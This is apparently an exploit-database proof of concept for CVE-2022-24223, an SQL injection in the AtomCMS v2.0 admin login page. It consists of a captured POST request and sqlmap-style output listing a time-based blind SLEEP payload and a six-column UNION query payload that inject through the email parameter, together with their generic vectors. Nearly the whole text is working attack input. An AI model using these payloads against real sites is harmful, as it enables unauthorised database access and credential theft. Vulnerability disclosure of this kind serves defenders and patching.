AtomCMS v2.0 - SQLi

# CVE
CVE-2022-24223

# POC
http://127.0.0.1/Atom.CMS/admin/login.php

POST /Atom.CMS/admin/login.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/Atom.CMS/admin/login.php
Cookie: PHPSESSID=tqfebdu4kn9qj7g6qpa91j9859
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
email=test%40test.com&password=1234


# payload
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 5613 FROM
(SELECT(SLEEP(5)))JnLZ) AND 'pROE'='pROE&password=1234
    Vector: AND (SELECT [RANDNUM] FROM
(SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: email=test@test.com' UNION ALL SELECT
NULL,CONCAT(0x717a767a71,0x65557a784e446152424b63724b5a737062464a4267746c70794d5976484c484a5365634158734975,0x71627a7871),NULL,NULL,NULL,NULL--
-&password=1234
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL-- -
---
